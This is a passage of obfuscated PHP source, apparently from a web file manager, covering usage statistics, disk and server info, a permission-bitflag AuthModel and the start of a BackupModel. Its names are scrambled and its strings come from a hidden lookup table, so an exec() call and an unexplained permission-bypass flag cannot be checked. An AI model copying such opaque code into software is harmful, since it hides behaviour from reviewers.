array($fõÕ‹ÄÀ‚©[544] => array($fõÕ‹ÄÀ‚©[702] => LNG($fõÕ‹ÄÀ‚©[2043]), $fõÕ‹ÄÀ‚©[2027] => LNG($fõÕ‹ÄÀ‚©[2044]), $fõÕ‹ÄÀ‚©[2028] => LNG($fõÕ‹ÄÀ‚©[2045])), $fõÕ‹ÄÀ‚©[2029] => array($fõÕ‹ÄÀ‚©[700] => LNG($fõÕ‹ÄÀ‚©[2046]), $fõÕ‹ÄÀ‚©[2031] => LNG($fõÕ‹ÄÀ‚©[2047]), $fõÕ‹ÄÀ‚©[2032] => LNG($fõÕ‹ÄÀ‚©[2048]), $fõÕ‹ÄÀ‚©[2033] => LNG($fõÕ‹ÄÀ‚©[2049]))); $C¸†ˆ¢°ˆĞ = array($fõÕ‹ÄÀ‚©[544] => $fõÕ‹ÄÀ‚©[2050], $fõÕ‹ÄÀ‚©[2029] => $fõÕ‹ÄÀ‚©[77]); goto aš¶ººáàĞ; dÚ®Ãâø: return $eµƒó£ÇÈ‘; goto DåÂäø¯‹„; f®‘çòÔ¦÷: $fõÕ‹ÄÀ‚© =& $_SERVER[í…¶]; if (!$this->init($BŠ»ŞÛµ¹î)) { return !1; } $D‰ŞŒœíè… = $this->trendList($BŠ»ŞÛµ¹î); goto eô¹ªøÍ°™; DåÂäø¯‹„: } public function validDate($A×“íÙñë…, $d«Óóâ‡¥) { goto CñÄê©¥«˜; CñÄê©¥«˜: $bÑ‹™ƒóÄ· =& $_SERVER[í…¶]; $d±Õƒ¶ğ­ = date($bÑ‹™ƒóÄ·[2034], strtotime($bÑ‹™ƒóÄ·[2035])); $c„¤ùğºï° = array($d±Õƒ¶ğ­); goto B‰á©’´è; b˜‰†¬—š¹: return $c„¤ùğºï°; goto C•Íò’…Àœ; B‰á©’´è: switch ($A×“íÙñë…) { case $bÑ‹™ƒóÄ·[1415]: $D…¢å°¥ŒÑ = mktime(0, 0, 0, date($bÑ‹™ƒóÄ·[2051]), date($bÑ‹™ƒóÄ·[2052]) - date($bÑ‹™ƒóÄ·[1224]) + 7 - 7, date($bÑ‹™ƒóÄ·[2053])); $e÷¦«Òœ¾‚ = 0; do { $D½öÆ½‹ÎØ = date($bÑ‹™ƒóÄ·[2034], $D…¢å°¥ŒÑ - 3600 * 24 * 7 * $e÷¦«Òœ¾‚); $c„¤ùğºï°[] = $D½öÆ½‹ÎØ; $e÷¦«Òœ¾‚++; } while ($d«Óóâ‡¥ < $D½öÆ½‹ÎØ); break; case $bÑ‹™ƒóÄ·[1413]: $e÷¦«Òœ¾‚ = 1; do { $dâö™¢²˜ = date($bÑ‹™ƒóÄ·[2054], strtotime("\55\x20{$e÷¦«Òœ¾‚}\x20\x6d\157\x6e\x74\x68\x73")); $c„¤ùğºï°[] = $dâö™¢²˜; $e÷¦«Òœ¾‚++; } while ($d«Óóâ‡¥ < $dâö™¢²˜); break; case $bÑ‹™ƒóÄ·[1722]: $B‡Åê¶÷íà = (int) date($bÑ‹™ƒóÄ·[2053], strtotime($d«Óóâ‡¥)); $bø÷óŒªÆÖ = (int) date($bÑ‹™ƒóÄ·[2053]); if ($B‡Åê¶÷íà >= $bø÷óŒªÆÖ) { break; } for ($B‡Åê¶÷íà; $B‡Åê¶÷íà < $bø÷óŒªÆÖ; $B‡Åê¶÷íà++) { $c„¤ùğºï°[] = $B‡Åê¶÷íà . $bÑ‹™ƒóÄ·[2055]; } break; default: break; } if ($d«Óóâ‡¥ > end($c„¤ùğºï°)) { array_pop($c„¤ùğºï°); } sort($c„¤ùğºï°); goto b˜‰†¬—š¹; C•Íò’…Àœ: } public function listTable($B©­µ™¥) { $BŸäÌ£ŠÁò = ucfirst($B©­µ™¥); return Model($BŸäÌ£ŠÁò)->listData(); } public function option($b”âñäƒ³İ) { $AÊÕƒÎ’‡ = $_SERVER[í…¶][2056] . ucfirst($b”âñäƒ³İ); return $this->{$AÊÕƒÎ’‡}(); } private function optionUser() { goto eâù«ˆè»³; A–‚ğé¾™ç: if (!$e¤‰òçµÏ›) { $e¤‰òçµÏ› = 1; } $DİÄäù¤Ÿ‹ = strtotime(date($Cì£°ˆŞÌ¾[2038])); $EÄ´©ÀŸµİ = array($Cì£°ˆŞÌ¾[2059] => array($Cì£°ˆŞÌ¾[926], $DİÄäù¤Ÿ‹)); goto A¾‹»¯Ûª; A¾‹»¯Ûª: $DŠŠØ ¹‚å = Model($Cì£°ˆŞÌ¾[486])->where($EÄ´©ÀŸµİ)->count($Cì£°ˆŞÌ¾[1433]); return array($Cì£°ˆŞÌ¾[697] => (int) $aá‰—µÛÆ‹, $Cì£°ˆŞÌ¾[2060] => (int) ($aá‰—µÛÆ‹ - $BéÒ‡‹‡ôÖ), $Cì£°ˆŞÌ¾[2061] => (int) $BéÒ‡‹‡ôÖ, $Cì£°ˆŞÌ¾[2062] => (int) $DŠŠØ ¹‚å, $Cì£°ˆŞÌ¾[2063] => $e¤‰òçµÏ›); goto bª‚ÚÑÅÅß; C‘Âˆï: $DİÄäù¤Ÿ‹ = strtotime($Cì£°ˆŞÌ¾[2058]); $EÄ´©ÀŸµİ = array($Cì£°ˆŞÌ¾[2059] => array($Cì£°ˆŞÌ¾[926], $DİÄäù¤Ÿ‹)); $e¤‰òçµÏ› = (int) Model($Cì£°ˆŞÌ¾[486])->where($EÄ´©ÀŸµİ)->count($Cì£°ˆŞÌ¾[1433]); goto A–‚ğé¾™ç; eâù«ˆè»³: $Cì£°ˆŞÌ¾ =& $_SERVER[í…¶]; $aá‰—µÛÆ‹ = Model($Cì£°ˆŞÌ¾[486])->count($Cì£°ˆŞÌ¾[1433]); $BéÒ‡‹‡ôÖ = Model($Cì£°ˆŞÌ¾[486])->where($Cì£°ˆŞÌ¾[2057])->count($Cì£°ˆŞÌ¾[1433]); goto C‘Âˆï; bª‚ÚÑÅÅß: } private function optionFile() { goto d­œ‘˜‹; c‡ÓöäÓÆŸ: $eŠù–÷»ß‡ = Model($fÑìØ×”©Ü[755])->where($b­»¦Èâ¬)->sum($fÑìØ×”©Ü[77]); $D£ªİšîìÇ = Model($fÑìØ×”©Ü[755])->where($b­»¦Èâ¬)->count($fÑìØ×”©Ü[378]); return array($fÑìØ×”©Ü[700] => $dÊƒ‹Ë„ÇÈ, $fÑìØ×”©Ü[2031] => $DìØ‘•ã§, $fÑìØ×”©Ü[2064] => $dÊƒ‹Ë„ÇÈ - $DìØ‘•ã§, $fÑìØ×”©Ü[2065] => (int) $eŠù–÷»ß‡, $fÑìØ×”©Ü[702] => (int) $bÕ¦šÏ‡ïÇ, $fÑìØ×”©Ü[2066] => (int) $D£ªİšîìÇ); goto b“ª–¡”¥»; e¹İŒéÊŒ‡: $DìØ‘•ã§ = $bˆ’í²‡®[$fÑìØ×”©Ü[2031]]; $bÕ¦šÏ‡ïÇ = Model($fÑìØ×”©Ü[755])->where(array($fÑìØ×”©Ü[379] => 0))->count($fÑìØ×”©Ü[378]); $b­»¦Èâ¬ = array($fÑìØ×”©Ü[379] => 0, $fÑìØ×”©Ü[187] => array($fÑìØ×”©Ü[926], strtotime(date($fÑìØ×”©Ü[2038])))); goto c‡ÓöäÓÆŸ; d­œ‘˜‹: $fÑìØ×”©Ü =& $_SERVER[í…¶]; $bˆ’í²‡® = $this->sourceSize(); $dÊƒ‹Ë„ÇÈ = $bˆ’í²‡®[$fÑìØ×”©Ü[77]]; goto e¹İŒéÊŒ‡; b“ª–¡”¥»: } private function optionAccess() { $Eˆ›‘ÓîêÅ =& $_SERVER[í…¶]; return array($Eˆ›‘ÓîêÅ[697] => $this->typeLogCnt(), $Eˆ›‘ÓîêÅ[103] => $this->typeLogCnt($Eˆ›‘ÓîêÅ[103]), $Eˆ›‘ÓîêÅ[413] => $this->typeLogCnt($Eˆ›‘ÓîêÅ[413]), $Eˆ›‘ÓîêÅ[2067] => $this->typeLogCnt($Eˆ›‘ÓîêÅ[2067]), $Eˆ›‘ÓîêÅ[2068] => $this->typeLogCnt($Eˆ›‘ÓîêÅ[2068]), $Eˆ›‘ÓîêÅ[544] => $this->typeLogCnt($Eˆ›‘ÓîêÅ[33], $Eˆ›‘ÓîêÅ[2042])); } private function typeLogCnt($cÂ‡Éò°ÚÍ = '', $CÒ¸Ğ»ÊÑ“ = "\151\x64") { goto cÔæíÎÏ¹ç; c‘À–¬·Ğî: return (int) $b¹¼Ã¿œÔš; goto FÒçÌïˆ; eÑô§º§ÍÛ: $AÀêÛªàÖÑ = array($E±»Ôİ«»õ[187] => array($E±»Ôİ«»õ[926], $Cğ«‡ñ¹©)); if ($cÂ‡Éò°ÚÍ) { $AÀêÛªàÖÑ[$E±»Ôİ«»õ[29]] = array($E±»Ôİ«»õ[7], $a†¥éáŸ‡È[$cÂ‡Éò°ÚÍ]); } $b¹¼Ã¿œÔš = Model($E±»Ôİ«»õ[2041])->where($AÀêÛªàÖÑ)->count($CÒ¸Ğ»ÊÑ“); goto c‘À–¬·Ğî; cÔæíÎÏ¹ç: $E±»Ôİ«»õ =& $_SERVER[í…¶]; $a†¥éáŸ‡È = array($E±»Ôİ«»õ[103] => array($E±»Ôİ«»õ[2069], $E±»Ôİ«»õ[2070]), $E±»Ôİ«»õ[413] => array($E±»Ôİ«»õ[2071], $E±»Ôİ«»õ[2072]), $E±»Ôİ«»õ[2067] => array($E±»Ôİ«»õ[2073], $E±»Ôİ«»õ[2074], $E±»Ôİ«»õ[2075]), $E±»Ôİ«»õ[2068] => array($E±»Ôİ«»õ[2076], $E±»Ôİ«»õ[2077]), $E±»Ôİ«»õ[2078] => array($E±»Ôİ«»õ[2079], $E±»Ôİ«»õ[2080], $E±»Ôİ«»õ[2081])); $Cğ«‡ñ¹© = strtotime(date($E±»Ôİ«»õ[2038])); goto eÑô§º§ÍÛ; FÒçÌïˆ: } private function optionServer() { goto C¬ÆŞÙîÏÁ; d‡ç™øõÜ: return array($F‘†Ö§Ä·[2084] => $b¡¼ˆŒöÛ· ? $b¡¼ˆŒöÛ·[$F‘†Ö§Ä·[2085]] : 0, $F‘†Ö§Ä·[2086] => $b¡¼ˆŒöÛ· ? $b¡¼ˆŒöÛ·[$F‘†Ö§Ä·[2087]] : 0, $F‘†Ö§Ä·[2088] => (int) $C¯±Š¸¢Ì°[$F‘†Ö§Ä·[2085]] * 1024 * 1024 * 1024, $F‘†Ö§Ä·[2089] => (int) $bÓÁ÷—¼‹œ, $F‘†Ö§Ä·[2090] => ucfirst($A“Ÿò”­ô), $F‘†Ö§Ä·[2091] => $F‘†Ö§Ä·[2092] . PHP_VERSION, $F‘†Ö§Ä·[2093] => phpBuild64() ? 64 : 32, $F‘†Ö§Ä·[696] => str_replace($F‘†Ö§Ä·[2094], $F‘†Ö§Ä·[902], $eÎğˆ„ˆÏë), $F‘†Ö§Ä·[337] => ucfirst($a‰Âğó¬êŸ), $F‘†Ö§Ä·[28] => $_SERVER[$F‘†Ö§Ä·[2095]]); goto FçãÙ‡±¢‘; aä°è¤Ã¼Ë: $A‘¿ÈÎ‘ = array($F‘†Ö§Ä·[746] => $C¯±Š¸¢Ì°[$F‘†Ö§Ä·[376]]); $bÓÁ÷—¼‹œ = Model($F‘†Ö§Ä·[431])->where($A‘¿ÈÎ‘)->sum($F‘†Ö§Ä·[77]); $bºª¤²ÉÁÖ = explode($F‘†Ö§Ä·[50], $_SERVER[$F‘†Ö§Ä·[139]]); goto d»‘Áå£Î; d»‘Áå£Î: $A“Ÿò”­ô = $bºª¤²ÉÁÖ[0]; $e£±ÍÅÚ‰† = $GLOBALS[$F‘†Ö§Ä·[6]][$F‘†Ö§Ä·[17]]; $eÎğˆ„ˆÏë = $e£±ÍÅÚ‰†[$F‘†Ö§Ä·[886]]; goto DäË–‰‹±Â; DäË–‰‹±Â: if ($eÎğˆ„ˆÏë == $F‘†Ö§Ä·[726]) { $f‰Æ¿ã«Âì = explode($F‘†Ö§Ä·[1074], $e£±ÍÅÚ‰†[$F‘†Ö§Ä·[885]]); $eÎğˆ„ˆÏë = $f‰Æ¿ã«Âì[0]; } if ($eÎğˆ„ˆÏë == $F‘†Ö§Ä·[729] || $eÎğˆ„ˆÏë == $F‘†Ö§Ä·[730]) { $Eø˜‹¥Ïğ§ = Model()->db()->query($F‘†Ö§Ä·[2082]); $BÊ•ÉØ¯Ø = $Eø˜‹¥Ïğ§[0] && isset($Eø˜‹¥Ïğ§[0][$F‘†Ö§Ä·[1338]]) ? $Eø˜‹¥Ïğ§[0][$F‘†Ö§Ä·[1338]] : 0; $eÎğˆ„ˆÏë = $F‘†Ö§Ä·[2083] . ($BÊ•ÉØ¯Ø ? $F‘†Ö§Ä·[8] . $BÊ•ÉØ¯Ø : $F‘†Ö§Ä·[33]); } $a‰Âğó¬êŸ = $GLOBALS[$F‘†Ö§Ä·[6]][$F‘†Ö§Ä·[337]][$F‘†Ö§Ä·[757]]; goto d‡ç™øõÜ; C¬ÆŞÙîÏÁ: $F‘†Ö§Ä· =& $_SERVER[í…¶]; $b¡¼ˆŒöÛ· = $this->diskDriver(); $C¯±Š¸¢Ì° = KodIO::defaultDriver(); goto aä°è¤Ã¼Ë; FçãÙ‡±¢‘: } private function diskDriver() { goto A„¿‚•…Èç; D¡‚°‘âŸ: if ($D‰Å¿ášÜ) { $eùîäÂŒ‡õ = $Cª¢å¤†Ü‰[2098]; if (function_exists($Cª¢å¤†Ü‰[2099])) { exec($Cª¢å¤†Ü‰[2100], $CÃÕ©Êğ£); $eùîäÂŒ‡õ = $CÃÕ©Êğ£[1] . $Cª¢å¤†Ü‰[8]; } } if (!file_exists($eùîäÂŒ‡õ)) { return; } $BÈäÈÂÊĞà = @disk_total_space($eùîäÂŒ‡õ); goto cÜÀØ‡¯À…; cÜÀØ‡¯À…: $aäÊ¸ˆÃ“ = $BÈäÈÂÊĞà - @disk_free_space($eùîäÂŒ‡õ); return array($Cª¢å¤†Ü‰[2085] => $BÈäÈÂÊĞà, $Cª¢å¤†Ü‰[2087] => $aäÊ¸ˆÃ“); goto eàÜè‹—Ü; A„¿‚•…Èç: $Cª¢å¤†Ü‰ =& $_SERVER[í…¶]; $eùîäÂŒ‡õ = $Cª¢å¤†Ü‰[8]; $D‰Å¿ášÜ = $GLOBALS[$Cª¢å¤†Ü‰[6]][$Cª¢å¤†Ü‰[2096]] == $Cª¢å¤†Ü‰[2097]; goto D¡‚°‘âŸ; eàÜè‹—Ü: } public function fileChart($CöƒÍÙ¶ô¸) { goto f‡ œšßßÚ; f‡ œšßßÚ: $c½¢åÖ’›« =& $_SERVER[í…¶]; if (isset($CöƒÍÙ¶ô¸[$c½¢åÖ’›«[1433]])) { return Model($c½¢åÖ’›«[755])->userFileTypeProfile($CöƒÍÙ¶ô¸[$c½¢åÖ’›«[1433]]); } if (isset($CöƒÍÙ¶ô¸[$c½¢åÖ’›«[2101]])) { return Model($c½¢åÖ’›«[755])->groupFileTypeProfile($CöƒÍÙ¶ô¸[$c½¢åÖ’›«[2101]]); } goto fŒÉŠËò“ù; bÜª’ÍŠå¶: $EªÁ ‡§¶«[$c½¢åÖ’›«[380]] = 2; $FŸ©åŠÂÁã = Model($c½¢åÖ’›«[755])->where($EªÁ ‡§¶«)->sum($c½¢åÖ’›«[77]); return array($c½¢åÖ’›«[700] => $EÜ­í£Ğóô[$c½¢åÖ’›«[77]], $c½¢åÖ’›«[2031] => $EÜ­í£Ğóô[$c½¢åÖ’›«[2031]], $c½¢åÖ’›«[2032] => (int) $dØŞ¥¦—ñ, $c½¢åÖ’›«[2033] => (int) $FŸ©åŠÂÁã); goto Fø½‰¦··; fŒÉŠËò“ù: $EÜ­í£Ğóô = $this->sourceSize(); $EªÁ ‡§¶« = array($c½¢åÖ’›«[470] => 0, $c½¢åÖ’›«[380] => 1); $dØŞ¥¦—ñ = Model($c½¢åÖ’›«[755])->where($EªÁ ‡§¶«)->sum($c½¢åÖ’›«[77]); goto bÜª’ÍŠå¶; Fø½‰¦··: } private function sourceSize() { $A¶ğ§ƒ¬ƒË =& $_SERVER[í…¶]; $f›ƒ¤‹ì¯´ = Model($A¶ğ§ƒ¬ƒË[755])->where(array($A¶ğ§ƒ¬ƒË[379] => 0))->sum($A¶ğ§ƒ¬ƒË[77]); $d²ƒŠ‡‡¼ = Model($A¶ğ§ƒ¬ƒË[431])->sum($A¶ğ§ƒ¬ƒË[77]); if ($d²ƒŠ‡‡¼ > $f›ƒ¤‹ì¯´) { $d²ƒŠ‡‡¼ = $f›ƒ¤‹ì¯´; } return array($A¶ğ§ƒ¬ƒË[77] => (int) $f›ƒ¤‹ì¯´, $A¶ğ§ƒ¬ƒË[2031] => (int) $d²ƒŠ‡‡¼); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $c´âéŸŞ¨Å =& $_SERVER[í…¶]; $B³‰›ùæ’ = array(array($c´âéŸŞ¨Å[395] => LNG($c´âéŸŞ¨Å[2102]), $c´âéŸŞ¨Å[2103] => $c´âéŸŞ¨Å[2104], $c´âéŸŞ¨Å[2105] => 6, $c´âéŸŞ¨Å[2106] => 1, $c´âéŸŞ¨Å[2107] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($c´âéŸŞ¨Å[395] => LNG($c´âéŸŞ¨Å[2108]), $c´âéŸŞ¨Å[2103] => $c´âéŸŞ¨Å[2109], $c´âéŸŞ¨Å[2105] => 1, $c´âéŸŞ¨Å[2106] => 1, $c´âéŸŞ¨Å[2107] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($c´âéŸŞ¨Å[395] => LNG($c´âéŸŞ¨Å[2110]), $c´âéŸŞ¨Å[2103] => $c´âéŸŞ¨Å[2111], $c´âéŸŞ¨Å[2105] => 2, $c´âéŸŞ¨Å[2106] => 1, $c´âéŸŞ¨Å[2107] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($c´âéŸŞ¨Å[395] => LNG($c´âéŸŞ¨Å[2112]), $c´âéŸŞ¨Å[2103] => $c´âéŸŞ¨Å[2111], $c´âéŸŞ¨Å[2105] => 3, $c´âéŸŞ¨Å[2106] => 1, $c´âéŸŞ¨Å[2107] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($c´âéŸŞ¨Å[395] => LNG($c´âéŸŞ¨Å[2113]), $c´âéŸŞ¨Å[2103] => $c´âéŸŞ¨Å[2114], $c´âéŸŞ¨Å[2105] => 4, $c´âéŸŞ¨Å[2106] => 1, $c´âéŸŞ¨Å[2107] => self::AUTH_SHOW | self::AUTH_VIEW), array($c´âéŸŞ¨Å[395] => LNG($c´âéŸŞ¨Å[2115]), $c´âéŸŞ¨Å[2103] => $c´âéŸŞ¨Å[2116], $c´âéŸŞ¨Å[2105] => 5, $c´âéŸŞ¨Å[2106] => 1, $c´âéŸŞ¨Å[2107] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($c´âéŸŞ¨Å[395] => LNG($c´âéŸŞ¨Å[2117]), $c´âéŸŞ¨Å[2103] => $c´âéŸŞ¨Å[2118], $c´âéŸŞ¨Å[2105] => 7, $c´âéŸŞ¨Å[2106] => 1, $c´âéŸŞ¨Å[2107] => 0)); return $B³‰›ùæ’; } public static function authCheck($B¶´—Ş…äê, $e½„¯™ğ§—) { $B¶´—Ş…äê = intval($B¶´—Ş…äê); if (_get($GLOBALS, $_SERVER[í…¶][466])) { return !0; } if ($B¶´—Ş…äê <= 0) { return !1; } if (($B¶´—Ş…äê & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($B¶´—Ş…äê & $e½„¯™ğ§—); } public static function authCheckShow($b¶çõÎÃö) { return self::authCheck($b¶çõÎÃö, self::AUTH_SHOW); } public static function authCheckView($B•”›Ä«) { return self::authCheck($B•”›Ä«, self::AUTH_VIEW); } public static function authCheckDownload($fœçê»™ á) { return self::authCheck($fœçê»™ á, self::AUTH_DOWNLOAD); } public static function authCheckUpload($f›Ü­øÁòµ) { return self::authCheck($f›Ü­øÁòµ, self::AUTH_UPLOAD); } public static function authCheckEdit($B˜‚‘Û°) { return self::authCheck($B˜‚‘Û°, self::AUTH_EDIT); } public static function authCheckRemove($c¦¶ğ¿Œ³À) { return self::authCheck($c¦¶ğ¿Œ³À, self::AUTH_REMOVE); } public static function authCheckShare($F¿ò½»ÜŠ) { return self::authCheck($F¿ò½»ÜŠ, self::AUTH_SHARE); } public static function authCheckComment($BÙÚ÷—•ß) { return self::authCheck($BÙÚ÷—•ß, self::AUTH_COMMENT); } public static function authCheckEvent($eÙ…ÏßÃå³) { return self::authCheck($eÙ…ÏßÃå³, self::AUTH_EVENT); } public static function authCheckRoot($fõ¡äàÇ‰ò) { return self::authCheck($fõ¡äàÇ‰ò, self::AUTH_ROOT); } public static function authDisable($C”ù–Œ‹êÜ, $Fä•õ¬Ú­‡) { if (intval($C”ù–Œ‹êÜ) <= 0) { return 0; } return intval($C”ù–Œ‹êÜ) & ~$Fä•õ¬Ú­‡; } public $optionType = "\x53\171\163\x74\145\155\56\163\x6f\165\162\143\x65\x41\165\x74\x68\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\141\x75\x74\x68", "\x6c\141\x62\145\x6c", "\144\151\163\160\x6c\x61\x79", "\163\x79\x73\164\145\155", "\163\x6f\162\164"); public function initData() { $DÙáõ†¸¹â = $this->authDefault(); foreach ($DÙáõ†¸¹â as $D‹Ÿ‡‘‹ì) { $this->add($D‹Ÿ‡‘‹ì); } } public function listData($cåãäŒãôŠ = false, $c¼»²ŒŞø = "\x73\x6f\162\x74", $A“õÍ›††ö = false) { return parent::listData($cåãäŒãôŠ, $c¼»²ŒŞø, $A“õÍ›††ö); } public function update($c±‘ñäéää, $fºöö…ê¬Ä) { $aƒ¿ìÉ¯æ =& $_SERVER[í…¶]; $EÜÚã¿Îƒ‰ = parent::listData($c±‘ñäéää); $aÁ„ï–™÷ = $this->findByName($fºöö…ê¬Ä[$aƒ¿ìÉ¯æ[28]]); if (!$EÜÚã¿Îƒ‰ || $aÁ„ï–™÷ && $aÁ„ï–™÷[$aƒ¿ìÉ¯æ[376]] != $EÜÚã¿Îƒ‰[$aƒ¿ìÉ¯æ[376]]) { return !1; } $this->filterAuth($fºöö…ê¬Ä[$aƒ¿ìÉ¯æ[385]]); return parent::update($c±‘ñäéää, $fºöö…ê¬Ä); } public function remove($D¡—ÛÆ˜²×) { $D…š¢³àÉ = parent::listData($D¡—ÛÆ˜²×); if (!$D…š¢³àÉ || $D…š¢³àÉ[$_SERVER[í…¶][1078]]) { return !1; } return parent::remove($D¡—ÛÆ˜²×); } public function add($B†¼Åø­½ğ = array()) { goto díŸİ½Ø¬; eèŒÀƒ¾­Œ: $B†¼Åø­½ğ = array_merge($Aè‹‰¼é„Á, $B†¼Åø­½ğ); $B†¼Åø­½ğ[$B½áÆÂíµ[2122]] = $this->getSort(); $this->filterAuth($B†¼Åø­½ğ[$B½áÆÂíµ[385]]); goto Eò“££‘¸Ø; díŸİ½Ø¬: $B½áÆÂíµ =& $_SERVER[í…¶]; if ($this->findByName($B†¼Åø­½ğ[$B½áÆÂíµ[28]])) { return !1; } $Aè‹‰¼é„Á = array($B½áÆÂíµ[28] => $B½áÆÂíµ[33], $B½áÆÂíµ[385] => 1, $B½áÆÂíµ[2119] => $B½áÆÂíµ[2120], $B½áÆÂíµ[2121] => 1, $B½áÆÂíµ[1078] => 0, $B½áÆÂíµ[2122] => 0); goto eèŒÀƒ¾­Œ; Eò“££‘¸Ø: return parent::insert($B†¼Åø­½ğ); goto C²¿ÃÆÍ•; C²¿ÃÆÍ•: } private function getSort() { $e¬ïéÈĞªØ =& $_SERVER[í…¶]; $e†ÅóŒ = parent::listData(); $bõ˜ƒ•ù‘ = array_to_keyvalue($e†ÅóŒ, $e¬ïéÈĞªØ[33], $e¬ïéÈĞªØ[2122]); return empty($bõ˜ƒ•ù‘) ? 0 : max($bõ˜ƒ•ù‘) + 1; } private function filterAuth(&$C”³î±Ùã) { goto DˆĞø¹À¿¦; DˆĞø¹À¿¦: if (!$C”³î±Ùã) { return; } $b×˜©½õ¼ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $CÚ—è“®ğŞ = array(); goto aæ†ÀÏºÖâ; BŠ™êï‘: foreach ($CÚ—è“®ğŞ as $Bİˆ÷†Çİø) { if (isset($A†¡ã²¹ˆ¡[$Bİˆ÷†Çİø])) { $CÚ—è“®ğŞ = array_merge($CÚ—è“®ğŞ, $A†¡ã²¹ˆ¡[$Bİˆ÷†Çİø]); } } $CÚ—è“®ğŞ[] = self::AUTH_SHOW; $C”³î±Ùã = array_sum(array_unique($CÚ—è“®ğŞ)); goto B·Ü‚²‡Ğ; aæ†ÀÏºÖâ: foreach ($b×˜©½õ¼ as $Bİˆ÷†Çİø) { if ($C”³î±Ùã & $Bİˆ÷†Çİø) { $CÚ—è“®ğŞ[] = $Bİˆ÷†Çİø; } } if (in_array(self::AUTH_ROOT, $CÚ—è“®ğŞ)) { $C”³î±Ùã = array_sum($b×˜©½õ¼); return; } $A†¡ã²¹ˆ¡ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto BŠ™êï‘; B·Ü‚²‡Ğ: } public function sort($bµ¼¶¤Åº, $DğÑ…ÄâÉé) { return parent::update($bµ¼¶¤Åº, $DğÑ…ÄâÉé); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\x62\x61\x63\x6b\165\x70\x4c\x69\163\x74"; public $field = array("\x69\157", "\x6e\x61\155\145", "\163\x74\141\x74\x75\x73", "\143\x6f\156\164\145\156\164", "\162\145\x73\x75\154\x74", "\x74\151\155\x65\x46\162\157\155", "\x74\151\155\x65\x54\157"); public function config() { goto cöÙã¾ì–; aîÜŠ‚†¦Æ: $Fƒ¯Ëƒ¸Æí = is_array($Fƒ¯Ëƒ¸Æí) ? $Fƒ¯Ëƒ¸Æí : array(); if (!isset($Fƒ¯Ëƒ¸Æí[$AèÕà·§‰Â[694]])) { $Fƒ¯Ëƒ¸Æí[$AèÕà·§‰Â[694]] = $AèÕà·§‰Â[477]; } $C‹¶Ô„¿Êç = array(); goto C‚İˆÄ·åÀ; dåªîºë†Ô: if (isset($C‹¶Ô„¿Êç[$AèÕà·§‰Â[190]])) { $C‹¶Ô„¿Êç[$AèÕà·§‰Â[190]] = json_decode($C‹¶Ô„¿Êç[$AèÕà·§‰Â[190]], !0); } if (isset($Fƒ¯Ëƒ¸Æí[$AèÕà·§‰Â[190]])) { $C‹¶Ô„¿Êç[$AèÕà·§‰Â[190]][$AèÕà·§‰Â[1408]] = $Fƒ¯Ëƒ¸Æí[$AèÕà·§‰Â[190]]; unset($Fƒ¯Ëƒ¸Æí[$AèÕà·§‰Â[190]]); } return array_merge($C‹¶Ô„¿Êç, $Fƒ¯Ëƒ¸Æí); goto aêÑ¹¢±å¯; cöÙã¾ì–: $AèÕà·§‰Â =& $_SERVER[í…¶]; $Fƒ¯Ëƒ¸Æí = Model($AèÕà·§‰Â[1086])->get($AèÕà·§‰Â[716]); $Fƒ¯Ëƒ¸Æí = json_decode($Fƒ¯Ëƒ¸Æí, !0); goto aîÜŠ‚†¦Æ; C‚İˆÄ·åÀ: Action($AèÕà·§‰Â[2123])->taskInit(); $A™Ã¼¶Ù©¸ = Model($AèÕà·§‰Â[2124])->listData(); foreach ($A™Ã¼¶Ù©¸ as $F‹‰¨ø ğğ) { if ($F‹‰¨ø ğğ[$AèÕà·§‰Â[1078]] == $AèÕà·§‰Â[83] && $F‹‰¨ø ğğ[$AèÕà·§‰Â[1421]] == $AèÕà·§‰Â[2125]) { $C‹¶Ô„¿Êç = $F‹‰¨ø ğğ; break; } } goto dåªîºë†Ô; aêÑ¹¢±å¯: } public function listData($d‰ÓÒëÙˆ = false, $B‰İªÎ¨Çë = "\155\157\x64\x69\146\x79\124\x69\155\145", $E¥Á¦”¤‚ = false) { return parent::listData($d‰ÓÒëÙˆ, $B‰İªÎ¨Çë, !0); } public function lastItem() { $BŒÜ‡’µ†˜ = $this->listData(); return !empty($BŒÜ‡’µ†˜[0]) ? $BŒÜ‡’µ†˜[0] : null; } public function kill($f²ò¥İä¯) { goto eá›‰Ö—ˆ; bê¦Ë« ô¼: Task::kill($a„ÛŒß»××[715]); Task::kill($a„ÛŒß»××[731]); Task::kill($a„ÛŒß»××[739]); goto aÏ”Ø¯ÀŠ”; aÏ”Ø¯ÀŠ”: $a¨¶Ş±‚îÕ = $aÉÏäéºÂÆ[$a„ÛŒß»××[28]]; 